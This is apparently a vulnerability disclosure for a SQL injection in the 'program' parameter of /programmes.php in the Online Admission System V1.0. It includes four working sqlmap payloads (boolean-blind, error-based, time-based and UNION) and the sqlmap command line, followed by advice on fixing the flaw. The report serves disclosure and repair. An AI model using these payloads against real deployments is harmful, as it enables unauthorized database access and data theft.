# sourcecodester Online Admission System V1.0 /programmes.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Online Admission System

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/11685/online-admission-system.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /programmes.php

## Vulnerability location:
+ 'program' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=11685&title=Online+Admission+System)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/programmes.php' file of the 'Online Admission System' project. The reason for this issue is that attackers inject malicious code from the parameter 'program' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Admission System In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/programmes.php" file. This vulnerability stems from insufficient user input validation of the 'program' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ error-based
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: program (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: program=1 AND 6471=6471

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: program=1 AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(1315=1315,1))),0x716a7a7171),1315)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: program=1 AND (SELECT 3271 FROM (SELECT(SLEEP(5)))HZHZ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: program=-5411 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x4d676e7046637a42775468656349725052744a48666f45575478656a47426e6d584459705a4e7649,0x716a7a7171)-- -
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "http://localhost/programmes.php?program=1" --batch --level 5 --risk 2
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773063879242-b8f00f87-b9a7-4d22-943a-cb553a24fb3b.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
